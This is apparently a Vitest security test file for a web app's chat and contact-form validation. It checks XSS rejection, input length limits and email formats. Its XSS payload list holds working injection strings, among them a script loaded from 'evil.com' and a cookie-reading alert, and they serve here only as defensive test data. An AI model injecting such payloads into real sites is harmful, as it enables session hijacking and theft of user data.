import { describe, it, expect } from "vitest";
import { chatMessageSchema, contactFormSchema, sanitizeForDisplay } from "@/lib/validation";

describe("Security - XSS Prevention", () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<SCRIPT SRC=//evil.com/xss.js></SCRIPT>',
    'javascript:alert(document.cookie)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<form action="javascript:alert(1)">',
    'data: text/html,<script>alert(1)</script>',
    '<img src="x" onerror ="alert(1)">',
  ];

  xssPayloads.forEach((payload) => {
    it(`blocks XSS payload: ${payload.substring(0, 50)}...`, () => {
      const chatResult = chatMessageSchema.safeParse({ content: payload });
      expect(chatResult.success).toBe(false);
    });

    it(`blocks XSS in contact form name: ${payload.substring(0, 30)}...`, () => {
      const formResult = contactFormSchema.safeParse({
        name: payload,
        email: "test@test.com",
        message: "hello",
      });
      expect(formResult.success).toBe(false);
    });

    it(`blocks XSS in contact form message: ${payload.substring(0, 30)}...`, () => {
      const formResult = contactFormSchema.safeParse({
        name: "Test",
        email: "test@test.com",
        message: payload,
      });
      expect(formResult.success).toBe(false);
    });
  });

  it("sanitizeForDisplay neutralizes all HTML", () => {
    xssPayloads.forEach((payload) => {
      const sanitized = sanitizeForDisplay(payload);
      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("<img");
      expect(sanitized).not.toContain("<svg");
      expect(sanitized).not.toContain("<iframe");
    });
  });
});

describe("Security - Input Boundary Testing", () => {
  it("rejects messages at exactly max+1 length", () => {
    const result = chatMessageSchema.safeParse({ content: "a".repeat(2001) });
    expect(result.success).toBe(false);
  });

  it("accepts messages at exactly max length", () => {
    const result = chatMessageSchema.safeParse({ content: "a".repeat(2000) });
    expect(result.success).toBe(true);
  });

  it("rejects whitespace-only messages", () => {
    const result = chatMessageSchema.safeParse({ content: "   " });
    expect(result.success).toBe(false);
  });

  it("rejects name at 101 chars", () => {
    const result = contactFormSchema.safeParse({
      name: "a".repeat(101),
      email: "test@test.com",
      message: "hello",
    });
    expect(result.success).toBe(false);
  });

  it("accepts name at 100 chars", () => {
    const result = contactFormSchema.safeParse({
      name: "a".repeat(100),
      email: "test@test.com",
      message: "hello",
    });
    expect(result.success).toBe(true);
  });
});

describe("Security - Email Validation", () => {
  const invalidEmails = [
    "not-an-email",
    "@missing-local.com",
    "missing-at.com",
    "missing.domain@",
    "spaces in@email.com",
  ];

  invalidEmails.forEach((email) => {
    it(`rejects invalid email: ${email}`, () => {
      const result = contactFormSchema.safeParse({
        name: "Test",
        email,
        message: "hello",
      });
      expect(result.success).toBe(false);
    });
  });

  it("accepts valid email formats", () => {
    const validEmails = [
      "user@example.com",
      "user.name@example.com",
      "user+tag@example.com",
    ];

    validEmails.forEach((email) => {
      const result = contactFormSchema.safeParse({
        name: "Test",
        email,
        message: "hello",
      });
      expect(result.success).toBe(true);
    });
  });
});

describe("Security - Environment Variables", () => {
  it("Supabase env vars are defined", () => {
    // These should be defined in the .env file
    expect(import.meta.env.VITE_SUPABASE_URL).toBeDefined();
    expect(import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY).toBeDefined();
  });
});
